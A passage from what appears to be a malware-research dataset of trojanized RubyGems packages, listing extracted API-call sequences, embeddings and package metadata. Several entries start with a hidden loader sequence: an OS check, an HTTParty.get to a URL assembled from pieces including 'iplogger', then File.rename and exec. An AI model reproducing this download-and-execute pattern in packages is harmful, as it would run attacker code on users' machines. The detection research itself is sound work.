'compiled_lines.<<', 'compiled_lines.length.==', 'compiled_lines.length', 'throw', 'self.[](:format).each', 'self.[]', 'parsers.[](format).parse_line', 'parsers.[]', 'options', 'compiled_lines.reject!', 'last_line.nil?', 'last_line.mergeable_with?', 'last_line.merge!', 'Set.new', 'compiled_lines.each', 'line.output_type.==', 'line.output_type', 'nicks.<<', 'line.sender', 'compiled_lines.[](-1).timestamp', 'compiled_lines.[]', 'compiled_lines.[](0).timestamp', 'compiled_lines.[]', 'self.[]', 'stats.[](:nicks).map!', 'stats.[]', 'Tag.new', '\"char:\".+', 'self.[]=', '(nick_tags.merge(self.[](:rp_tags))).to_a.sort', '(nick_tags.merge(self.[](:rp_tags)))\\n.to_a', 'nick_tags.merge', 'self.[]', 'update_tags', 'self.[]=', 'stats.[]', 'self.[]', 'stats.[]', 'attr_reader', '(config.[](\"tag_implications\") || {})\\n.freeze', 'config.[]', '(config.[](\"tag_aliases\") || {})\\n.freeze', 'config.[]', 'validate_tag_rules', 'Set.new', 'loop', 'tag_set.clone', 'catch', 'implicate_tags', 'alias_tags', 'fail_with', 'cyclical.[]', 'cyclical.[]', 'cyclical.[]', 'tag_set.==', 'private', '@tag_implications.keys.find', '@tag_implications.keys', '@tag_aliases.key?', 'fail_with', 'error_for_aliases_that_should_be_implications', '@tag_implications.keys.to_set.merge', '@tag_implications.keys.to_set', '@tag_implications.keys', '@tag_aliases.keys', 'update_tags', 'loop', 'Set.new', 'tags_to_check.each', '@tag_implications.fetch', 'imply.partition', 'removed_tags.include?', 'removed.empty?.!', 'removed.empty?', 'removed.size.==', 'removed.size', 'Jekyll.logger.warn', 'Jekyll.logger', 'to_add.merge', 'to_add.empty?', 'tag_set.merge', 'loop', 'Set.new', 'tags_to_check.each', '@tag_aliases.key?', '@tag_aliases.[]', 'aliased.each', 'removed_tags.include?', 'throw', 'removed_tags.<<', 'tag_set.delete', 'to_add.merge', 'to_add.empty?', 'tag_set.merge', '@tag_aliases.each_pair', 'v.include?', 'error_messages.<<', 'error_messages.empty?', 'fail_with', 'error_messages.join', 'Jekyll.logger.error', 'Jekyll.logger', 'fail', 'process', '(site.config.[](\"rp_tag_index_layout\") || \"tag_index\")\\n.+', 'site.config.[]', 'site.config', 'read_yaml', 'File.join', 'data.[]=', 'data', 'data.[]=', 'data', 'site.config.[](\"tag_descriptions\").[]', 'site.config.[]', 'site.config', 'tag.to_s', 'data.[]=', 'data', 'pages.sort_by', 'p.data.[]', 'p.data', 'site.config.[]', 'site.config', 'data.[]=', 'data', 'tag.name', 'safe', 'priority', 'config.[]', 'config.[]', 'site.config.[]', 'site.config', 'site.config.[]', 'site.config', 'rps_by_tag', 'tags.each_pair', 'site.pages.<<', 'site.pages', 'TagIndex.new', 'site.source', 'File.join', 'tag.dir', 'Jekyll.logger.info', 'Jekyll.logger', 'tags.size', 'private', 'Hash.new', 'hash.[]=', 'Set.new', 'site.collections.[](RpLogGenerator.rp_key).docs.each', 'site.collections.[](RpLogGenerator.rp_key).docs', 'site.collections.[]', 'site.collections', 'RpLogGenerator.rp_key', 'page.data.[](\"rp_tags\").each', 'page.data.[]', 'page.data', 'tag_ref.[](tag).<<', 'tag_ref.[]', '[:meta, :character, :general].freeze', '{ character: [\"rp-tag-character\"], meta: [\"rp-tag-meta\"], general: [] }.freeze', 'attr_accessor', 'args.[](0).map', 'args.[]', 'Tag.new', 'name.strip', 'CHAR_FLAG.=~', '$LAST_MATCH_INFO.[]', 'my_name.downcase', '@name.=~', 'name_to_dir', 'type.==', 'type', 'name', 'name', 'self.class.equal?', 'self.class', 'other.class', 'name.==', 'name', 'other.name', 'type.==', 'type', 'other.type', 'name.hash', 'name', 'self.class.==', 'self.class', 'o.class', 'type.==', 'type', 'o.type', 'name.<=>', 'name', 'o.name', 'type.==', 'type', 'o.type.==', 'o.type', 'type.==', 'type', 'o.type.==', 'o.type', 'self.class.name + \"[\" + @name + \", \" + @dir.+', 'self.class.name + \"[\" + @name + \", \".+', 'self.class.name + \"[\" + @name.+', 'self.class.name + \"[\".+', 'self.class.name.+', 'self.class.name', 'self.class', 'classes', 'TYPE_CLASSES.[](@type).join', 'TYPE_CLASSES.[]', 'private', 'name.gsub', 'require', 'include', 'load', 'Jekyll::RpLogs::RpTasks.new.install_tasks', 'Jekyll::RpLogs::RpTasks.new']",
            "n_tokens": 3675,
            "embedding": "[ 0.0075776  -0.03874099 -0.00970012 ...  0.00379376 -0.01070188\n  0.01990608]",
            "cluster": "0",
            "id": 196,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/jekyll-rp-logs/0.5.0/jekyll-rp-logs-0.5.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/jekyll-rp-logs/0.5.0/jekyll-rp-logs-0.5.0_extracted",
            "name": "jekyll-rp-logs",
            "version": "0.5.0",
            "published_at": "2020-02-25T23:57:35.122Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "nokogiri, rspec, simplecov, codeclimate-test-reporter, bundler, jekyll, rake, gli",
            "SHA-256": "799697772dd53e3fae17266b69ef2876948e0128dea64b22022e3b8267d23493"
        },
        {
            "name_version": "logs-visualizer-0.2.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/logs-visualizer/0.2.0/logs-visualizer-0.2.0_extracted/logs-visualizer-0.2.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'string_input.present?', 'GraphViz.new', 'g.[]=', 'populate_data', 'populate_graph', 'protected', 'logs_text.split(\"Started \").each', 'logs_text.split', 'action.present?', 'action.!=', '/(?<action>.*) for/.match(action).[]', '/(?<action>.*) for/.match', '/.*\\\\\"\\\\/assets.*/.match', 'action.split(\"\\\\r\\\\n\").each', 'action.split', '/Rendered (?<partial>(\\\\S)*).*\\\\((?<time>(\\\\S)*)ms/.match', '/\\\\[httplog\\\\] Sending: (?<service>.*)/.match', '/\\\\[httplog\\\\] Benchmark: (?<time>\\\\S*)/.match', '/Compiled (?<asset>(\\\\S)*).*\\\\((?<time>\\\\S*)ms\\\\)/.match', '/SQL.*\\\\((?<time>\\\\S*)ms\\\\).*INSERT INTO (?<table>(\\\\S)*)/.match', '/\\\\((?<time>\\\\S*)ms\\\\).*SELECT .* FROM (?<table>(\\\\S)*)/.match', '/\\\\((?<time>\\\\S*)ms\\\\).*UPDATE (?<table>(\\\\S)*)/.match', '/\\\\[active_model_serializers\\\\] Rendered (?<serializer>\\\\S*) with .* \\\\((?<time>\\\\S*)ms\\\\)/.match', 'partial_in_line.present?', 'options.[](:rendered_partials).==', 'options.[]', 'options.[](:all).==', 'options.[]', 'rendered_partials.<<', 'partial_in_line.[]', 'partial_in_line.[](:time).to_f', 'partial_in_line.[]', 'service_time_in_line.present?', 'options.[](:service_requests).==', 'options.[]', 'options.[](:all).==', 'options.[]', 'service_times.<<', 'service_time_in_line.[](:time).to_f', 'service_time_in_line.[]', 'service_request_in_line.present?', 'options.[](:service_requests).==', 'options.[]', 'options.[](:all).==', 'options.[]', 'service_requests.<<', 'service_request_in_line.[]', 'compiled_asset_in_line.present?', 'options.[](:compiled_assets).==', 'options.[]', 'options.[](:all).==', 'options.[]', 'compiled_assets.<<', 'compiled_asset_in_line.[]', 'compiled_asset_in_line.[](:time).to_f', 'compiled_asset_in_line.[]', 'sql_insertion_in_line.present?', 'options.[](:sql_visualization).==', 'options.[]', 'options.[](:all).==', 'options.[]', 'sql_insertions.<<', 'sql_insertion_in_line.[]', 'sql_insertion_in_line.[](:time).to_f', 'sql_insertion_in_line.[]', 'sql_select_in_line.present?', 'options.[](:sql_visualization).==', 'options.[]', 'options.[](:all).==', 'options.[]', 'sql_selections.<<', 'sql_select_in_line.[]', 'sql_select_in_line.[](:time).to_f', 'sql_select_in_line.[]', 'sql_update_in_line.present?', 'options.[](:sql_visualization).==', 'options.[]', 'options.[](:all).==', 'options.[]', 'sql_updates.<<', 'sql_update_in_line.[]', 'sql_update_in_line.[](:time).to_f', 'sql_update_in_line.[]', 'serializer_in_line.present?', 'options.[](:serializers).==', 'options.[]', 'options.[](:all).==', 'options.[]', 'serializers.<<', 'serializer_in_line.[]', 'serializer_in_line.[](:time).to_f', 'serializer_in_line.[]', '/Processing by (?<controller>.*) as/.match(action).[]', '/Processing by (?<controller>.*) as/.match', '/Redirected to (?<redirect_url>(\\\\S)*)/.match', 'data.[](:nodes).size.>', 'data.[](:nodes).size', 'data.[]', 'data.[](:nodes).map { |node,|\\n  node.[](:label)\\n}.include?', 'data.[](:nodes).map', 'data.[]', 'node.[]', 'data.[](:nodes).map', 'data.[]', 'node.[](:label).==', 'node.[]', 'node.[]', 'service_requests.each_with_index', 'services.<<', 'service_times.[]', 'data.[](:nodes).<<', 'data.[]', 'redirect_to_url.present?', 'URI', 'redirect_to_url.[]', 'rendered_partials.group_by', 'x.[]', 'compiled_assets.group_by', 'x.[]', 'sql_insertions.group_by', 'x.[]', 'sql_selections.group_by', 'x.[]', 'sql_updates.group_by', 'x.[]', 'serializers.group_by', 'x.[]', 'data.[](:nodes).present?', 'data.[]', 'data.[](:nodes).each', 'data.[]', 'node.[]=', 'graph.add_nodes', 'node.[]', 'node.[](:label).gsub', 'node.[]', 'node.[]', 'node.[](:rendered_partials).map { |partial, partials_array|\\n  partials_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  }.round(2)\\n}.max', 'node.[](:rendered_partials).map', 'node.[]', 'partials_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'partials_array.inject', 'sum.+', 'x.[]', 'node.[](:sql_insertions).map { |array_name, names_array|\\n  names_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  }.round(2)\\n}.max', 'node.[](:sql_insertions).map', 'node.[]', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'node.[](:compiled_assets).map { |array_name, names_array|\\n  names_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  }.round(2)\\n}.max', 'node.[](:compiled_assets).map', 'node.[]', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'node.[](:sql_selections).map { |array_name, names_array|\\n  names_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  }.round(2)\\n}.max', 'node.[](:sql_selections).map', 'node.[]', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'node.[](:sql_updates).map { |array_name, names_array|\\n  names_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  }.round(2)\\n}.max', 'node.[](:sql_updates).map', 'node.[]', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'node.[](:service_requests).group_by { |x,|\\n  x.[](:service)\\n}.map { |service, services_array|\\n  (services_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  } * 1000).round(2)\\n}.max', 'node.[](:service_requests).group_by { |x,|\\n  x.[](:service)\\n}.map', 'node.[](:service_requests).group_by', 'node.[]', 'x.[]', '(services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n} * 1000)\\n.round', 'services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.*', 'services_array.inject', 'sum.+', 'x.[]', 'node.[](:serializers).map { |array_name, names_array|\\n  (names_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  }).round(2)\\n}.max', 'node.[](:serializers).map', 'node.[]', '(names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n})\\n.round', 'names_array.inject', 'sum.+', 'x.[]', 'node.[](:rendered_partials).map { |partial, partials_array|\\n  partials_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  }.round(2)\\n}.min', 'node.[](:rendered_partials).map', 'node.[]', 'partials_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'partials_array.inject', 'sum.+', 'x.[]', 'node.[](:sql_insertions).map { |array_name, names_array|\\n  names_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  }.round(2)\\n}.min', 'node.[](:sql_insertions).map', 'node.[]', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'node.[](:compiled_assets).map { |array_name, names_array|\\n  names_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  }.round(2)\\n}.min', 'node.[](:compiled_assets).map', 'node.[]', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'node.[](:sql_selections).map { |array_name, names_array|\\n  names_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  }.round(2)\\n}.min', 'node.[](:sql_selections).map', 'node.[]', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'node.[](:sql_updates).map { |array_name, names_array|\\n  names_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  }.round(2)\\n}.min', 'node.[](:sql_updates).map', 'node.[]', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'node.[](:service_requests).group_by { |x,|\\n  x.[](:service)\\n}.map { |service, services_array|\\n  (services_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  } * 1000).round(2)\\n}.min', 'node.[](:service_requests).group_by { |x,|\\n  x.[](:service)\\n}.map', 'node.[](:service_requests).group_by', 'node.[]', 'x.[]', '(services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n} * 1000)\\n.round', 'services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.*', 'services_array.inject', 'sum.+', 'x.[]', 'node.[](:serializers).map { |service, services_array|\\n  (services_array.inject(0) { |sum, x|\\n    sum + x.[](:time)\\n  }).round(2)\\n}.min', 'node.[](:serializers).map', 'node.[]', '(services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n})\\n.round', 'services_array.inject', 'sum.+', 'x.[]', 'node.[](:rendered_partials).each', 'node.[]', 'graph.add_nodes', 'partials_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'partials_array.inject', 'sum.+', 'x.[]', 'maximum_rendered_time.==', 'graph.add_edges', 'node.[]', 'partials_array.size', 'partials_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'partials_array.inject', 'sum.+', 'x.[]', 'minimum_rendered_time.==', 'graph.add_edges', 'node.[]', 'partials_array.size', 'partials_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'partials_array.inject', 'sum.+', 'x.[]', 'graph.add_edges', 'node.[]', 'partials_array.size', 'partials_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'partials_array.inject', 'sum.+', 'x.[]', 'node.[](:redirect).present?', 'node.[]', 'graph.add_edges', 'node.[]', 'node.[](:redirect).path', 'node.[]', 'node.[](:compiled_assets).each', 'node.[]', 'graph.add_nodes', 'assets_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'assets_array.inject', 'sum.+', 'x.[]', 'maximum_asset_compilation_time.==', 'graph.add_edges', 'node.[]', 'assets_array.size', 'assets_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'assets_array.inject', 'sum.+', 'x.[]', 'minimum_asset_compilation_time.==', 'graph.add_edges', 'node.[]', 'assets_array.size', 'assets_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'assets_array.inject', 'sum.+', 'x.[]', 'graph.add_edges', 'node.[]', 'assets_array.size', 'assets_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'assets_array.inject', 'sum.+', 'x.[]', 'node.[](:serializers).each', 'node.[]', 'graph.add_nodes', 'serializers_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'serializers_array.inject', 'sum.+', 'x.[]', 'maximum_serializer_time.==', 'graph.add_edges', 'node.[]', 'serializers_array.size', 'serializers_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'serializers_array.inject', 'sum.+', 'x.[]', 'minimum_serializer_time.==', 'graph.add_edges', 'node.[]', 'serializers_array.size', 'serializers_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'serializers_array.inject', 'sum.+', 'x.[]', 'graph.add_edges', 'node.[]', 'serializers_array.size', 'serializers_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'serializers_array.inject', 'sum.+', 'x.[]', 'node.[](:sql_insertions).each', 'node.[]', 'graph.add_nodes', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'maximum_sql_insertion_time.==', 'graph.add_edges', 'node.[]', 'names_array.size', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'minimum_sql_insertion_time.==', 'graph.add_edges', 'node.[]', 'names_array.size', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'graph.add_edges', 'node.[]', 'names_array.size', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'node.[](:sql_selections).each', 'node.[]', 'graph.add_nodes', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'maximum_sql_selection_time.==', 'graph.add_edges', 'node.[]', 'names_array.size', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'minimum_sql_selection_time.==', 'graph.add_edges', 'node.[]', 'names_array.size', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'graph.add_edges', 'node.[]', 'names_array.size', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'node.[](:sql_updates).each', 'node.[]', 'graph.add_nodes', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'maximum_sql_update_time.==', 'graph.add_edges', 'node.[]', 'names_array.size', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'minimum_sql_update_time.==', 'graph.add_edges', 'node.[]', 'names_array.size', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'graph.add_edges', 'node.[]', 'names_array.size', 'names_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.round', 'names_array.inject', 'sum.+', 'x.[]', 'node.[](:service_requests).map { |service,|\\n  { service: URI(service.[](:service).split(\" \").[](1)).host, time: service.[](:time) }\\n}.group_by { |x,|\\n  x.[](:service)\\n}.each', 'node.[](:service_requests).map { |service,|\\n  { service: URI(service.[](:service).split(\" \").[](1)).host, time: service.[](:time) }\\n}.group_by', 'node.[](:service_requests).map', 'node.[]', 'URI(service.[](:service).split(\" \").[](1)).host', 'URI', 'service.[](:service).split(\" \").[]', 'service.[](:service).split', 'service.[]', 'service.[]', 'x.[]', 'graph.add_nodes', 'graph.add_edges', 'node.[]', 'services_array.size', '(services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n} * 1000)\\n.round', 'services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.*', 'services_array.inject', 'sum.+', 'x.[]', 'node.[](:service_requests).group_by { |x,|\\n  x.[](:service)\\n}.each', 'node.[](:service_requests).group_by', 'node.[]', 'x.[]', 'service.split', 'graph.add_nodes', 'service_split.[]', '[URI(service.split(\" \").[](1)).path, URI(service.split(\" \").[](1)).query.presence].reject { |x,|\\n  x.blank?\\n}.join', '[URI(service.split(\" \").[](1)).path, URI(service.split(\" \").[](1)).query.presence].reject', 'URI(service.split(\" \").[](1)).path', 'URI', 'service.split(\" \").[]', 'service.split', 'URI(service.split(\" \").[](1)).query.presence', 'URI(service.split(\" \").[](1)).query', 'URI', 'service.split(\" \").[]', 'service.split', 'x.blank?', '(services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n} * 1000)\\n.round', 'services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.*', 'services_array.inject', 'sum.+', 'x.[]', 'total_time.==', 'graph.add_edges', 'URI(service.split(\" \").[](1)).host', 'URI', 'service.split(\" \").[]', 'service.split', 'services_array.size', '(services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n} * 1000)\\n.round', 'services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.*', 'services_array.inject', 'sum.+', 'x.[]', 'total_time.==', 'graph.add_edges', 'URI(service.split(\" \").[](1)).host', 'URI', 'service.split(\" \").[]', 'service.split', 'services_array.size', '(services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n} * 1000)\\n.round', 'services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.*', 'services_array.inject', 'sum.+', 'x.[]', 'graph.add_edges', 'URI(service.split(\" \").[](1)).host', 'URI', 'service.split(\" \").[]', 'service.split', 'services_array.size', '(services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n} * 1000)\\n.round', 'services_array.inject(0) { |sum, x|\\n  sum + x.[](:time)\\n}.*', 'services_array.inject', 'sum.+', 'x.[]', 'File.directory?', 'FileUtils.mkdir_p', 'File.directory?', 'FileUtils.mkdir_p', 'File.directory?', 'FileUtils.mkdir_p', 'File.directory?', 'FileUtils.mkdir_p', 'graph.output', 'graph_name.present?', 'DateTime.now.strftime', 'DateTime.now']",
            "n_tokens": 5428,
            "embedding": "[-0.00685043 -0.00444778 -0.01078068 ... -0.00702544 -0.01517095\n  0.01104069]",
            "cluster": "0",
            "id": 289,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/logs-visualizer/0.2.0/logs-visualizer-0.2.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/logs-visualizer/0.2.0/logs-visualizer-0.2.0_extracted",
            "name": "logs-visualizer",
            "version": "0.2.0",
            "published_at": "2020-02-25T23:59:23.429Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, ruby-graphviz",
            "SHA-256": "25337e2d7115c822de2a026cfd90b8d865c91035b3ee6ac467d581b3cefa5858"
        },
        {
            "name_version": "logstash-codec-avro-schema_registry-1.2.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/logstash-codec-avro-schema_registry/1.2.0/logstash-codec-avro-schema_registry-1.2.0_extracted/logstash-codec-avro-schema_registry-1.2.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'config_name', 'config', 'config', 'config', 'config', 'config', 'config', 'config', 'config', 'config', 'config', 'config', 'config', 'config', 'config', 'config', 'config', 'config', 'public', 'client_certificate.!=', 'client_certificate', 'SchemaRegistry::Client.new', 'endpoint', 'username', 'password', 'SchemaRegistry::Client.connection_options', 'client_certificate', 'client_key', 'ca_certificate', 'verify_mode', 'SchemaRegistry::Client.new', 'endpoint', 'username', 'password', 'Hash.new', '@schemas.has_key?', '@schemas.[]=', 'Avro::Schema.parse', '@client.schema', '@schemas.[]', 'open(@schema_uri).read', 'open', '@logger.error', '@subject_name.==', '@logger.error', '@client.subject', '@schema_version.!=', 'subject.version', 'load_schema_json', 'subject.compatible?', '@logger.error', 'subject.schema_registered?', 'subject.register_schema', 'subject.verify_schema', 'schema.id', 'event.to_hash', 'event_hash.delete_if', 'EXCLUDE_ALWAYS.include?', 'public', 'data.length.<', 'data.length', '@logger.error', 'StringIO.new', 'Base64.strict_decode64', 'StringIO.new', 'datum.read(5).unpack', 'datum.read', 'magic_byte.!=', '@logger.error', 'get_schema', 'Avro::IO::BinaryDecoder.new', 'Avro::IO::DatumReader.new', 'LogStash::Event.new', 'datum_reader.read', 'tag_on_failure', '@logger.error', 'LogStash::Event.new', 'raise', 'public', 'get_write_schema_id', 'get_schema', 'Avro::IO::DatumWriter.new', 'StringIO.new', 'buffer.write', 'MAGIC_BYTE.chr', 'buffer.write', '[@write_schema_id].pack', 'Avro::IO::BinaryEncoder.new', 'dw.write', 'clean_event', '@on_event.call', 'buffer.string.to_java_bytes', 'buffer.string', '@on_event.call', 'Base64.strict_encode64', 'buffer.string', '@on_event.call', 'buffer.string', 'require', 'require', 'require', 'require', 'describe', 'let', 'let', 'LogStash::Event.new', 'subject', 'LogStash::Codecs::AvroSchemaRegistry.new', 'avro_config', 'context', 'context']",
            "n_tokens": 641,
            "embedding": "[-0.00739268 -0.0029242  -0.00381092 ... -0.00010742 -0.01100932\n  0.0125835 ]",
            "cluster": "0",
            "id": 505,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/logstash-codec-avro-schema_registry/1.2.0/logstash-codec-avro-schema_registry-1.2.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/logstash-codec-avro-schema_registry/1.2.0/logstash-codec-avro-schema_registry-1.2.0_extracted",
            "name": "logstash-codec-avro-schema_registry",
            "version": "1.2.0",
            "published_at": "2020-02-26T00:11:30.417Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "logstash-devutils, logstash-core-plugin-api, logstash-codec-line, avro, schema_registry",
            "SHA-256": "33aa65250a6d4c6381afff583c54acf0e642c542b02b81d18505b464fdc7fd38"
        },
        {
            "name_version": "piratebay-api-0.1.6",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/piratebay-api/0.1.6/piratebay-api-0.1.6_extracted/piratebay-api-0.1.6_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', '[\"result\", \"pirate_bay\", \"categories\", \"details\", \"result_set\"].each', 'require', 'File.join', 'File.dirname', 'attr_accessor', 'search', '@service.==', 'results.<<', 'PirateBay::Search.new(@search_term, @category, @base_url).execute', 'PirateBay::Search.new', 'results.flatten.sort_by', 'results.flatten', '(sort.seeds)\\n.-@', 'sort.seeds', 'PirateBay::Search.new', 'raise', 'handler.execute', 'require', 'require', 'html.match', 'Regexp.new', 'id_matches.nil?', 'id_matches.[](1).to_i', 'id_matches.[]', 'params.[](:page).-', 'params.[]', '@comment_pages_html.[](index).nil?', '@comment_pages_html.[]', 'URI.parse', '@base_url.+', 'Net::HTTP.post_form', 'res.body', '@comment_pages_html.[]=', '@comment_pages_html.[]', 'comment_xhr_params.each', 'comment_xhr_params', 'fetch_comments', '@type.==', '@comment_pages_html.empty?', 'fetch_all_comments', '@comment_pages_html.inject', 'Nokogiri.HTML', 'Nokogiri.HTML', 'document.css(\"div.comment\").map', 'document.css', 'PirateBay::Details.search_for_ratings', 'comment.inner_html', 'scores.reject', 'r.empty?', 'Nokogiri.HTML', 'document.css(\"div.browse-coms a\").first', 'document.css', 'comment_link.nil?', 'PirateBay::Details.extract_xhr_params', 'comment_link.attr', 'Array.new', 'params.[]', 'i.+', 'results.map', 'params.[]', 'params.[]', 'params.[]', \"/comPage\\\\((\\\\d+),(\\\\d+),'(.+)', '(.+)'\\\\);/.match(string).captures\", \"/comPage\\\\((\\\\d+),(\\\\d+),'(.+)', '(.+)'\\\\);/.match\", 'page.to_i', 'pages.to_i', 'string.match', 'string.match', 'video_score_matches.nil?', 'ratings.[]=', 'video_score_matches.[](2).to_f', 'video_score_matches.[]', 'audio_score_matches.nil?', 'ratings.[]=', 'audio_score_matches.[](2).to_f', 'audio_score_matches.[]', 'ratings.[]', 'ratings.[](:v).>', 'ratings.[]', 'ratings.delete', 'ratings.[]', 'ratings.[](:a).>', 'ratings.[]', 'ratings.delete', 'scores.map { |score,|\\n  score.[](:v)\\n}.compact', 'scores.map', 'scores', 'score.[]', 'video_scores.inject', 'video_scores', '[video_scores.size.to_f, 1].max', 'video_scores.size.to_f', 'video_scores.size', 'video_scores', 'video_quality_score_sum./', 'video_quality_score_sum', 'scores.map { |score,|\\n  score.[](:a)\\n}.compact', 